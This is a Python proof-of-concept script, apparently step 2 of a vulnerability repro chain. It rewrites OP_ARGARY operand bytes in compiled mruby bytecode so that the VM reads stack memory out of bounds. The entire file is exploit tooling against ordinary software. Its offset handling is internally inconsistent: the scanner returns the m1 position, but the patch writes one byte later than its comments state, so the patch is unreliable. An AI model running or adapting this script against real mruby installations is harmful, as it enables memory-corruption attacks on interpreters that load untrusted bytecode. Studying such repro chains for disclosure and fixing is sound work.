#!/usr/bin/env python3
"""mruby OP_ARGARY operand patch (B-3, step 2 of the idx 231012 repro chain).

Usage:
    mrbc -o poc4.mrb poc4.rb       # step 1: compile a legal super-in-block program
    python3 patch_operand.py poc4.mrb poc4p.mrb   # step 2: 4-byte operand patch
    mruby -b poc4p.mrb 14          # step 3: recursion depth 14 triggers it

Patch content: locate the 4 operand bytes (B:m1:m2:S) after the OP_ARGARY(0x53)
instruction and change lv=1,m1=2,m2=0 to lv=0,m1=31,m2=31 -- the stack[m1+r+m2]
read loses its nregs bound, and at depth 14 the block frame is pushed into the
stack-slack < 62 window, i.e. out of bounds.
"""
import sys

OP_ARGARY = 0x53

def find_oparg(data: bytes) -> int:
    # Scan the IREP instruction stream byte by byte for OP_ARGARY; operand layout follows mruby 3.3.0 (RITE VM)
    i = 0
    while i < len(data) - 5:
        if data[i] == OP_ARGARY:
            # Operands: B(register) m1 m2 S(lv<<1|rest) -- the source program has m1=2, m2=0, S=0x02(lv=1)
            if data[i+2] == 2 and data[i+3] == 0 and data[i+4] == 2:
                return i + 2
        i += 1
    raise SystemExit('OP_ARGARY operands not located (check the layout produced by your mrbc version)')

def main():
    src, dst = sys.argv[1], sys.argv[2]
    data = bytearray(open(src, 'rb').read())
    off = find_oparg(data)
    print(f'OP_ARGARY operands @ 0x{off:x}: '
          f'm1={data[off+1]} m2={data[off+2]} lv={data[off+3]>>1}')
    data[off+1] = 31          # m1 = 31
    data[off+2] = 31          # m2 = 31
    data[off+3] = 0           # S: lv = 0
    open(dst, 'wb').write(data)
    print(f'wrote {dst} (m1=31 m2=31 lv=0)')

if __name__ == '__main__':
    main()
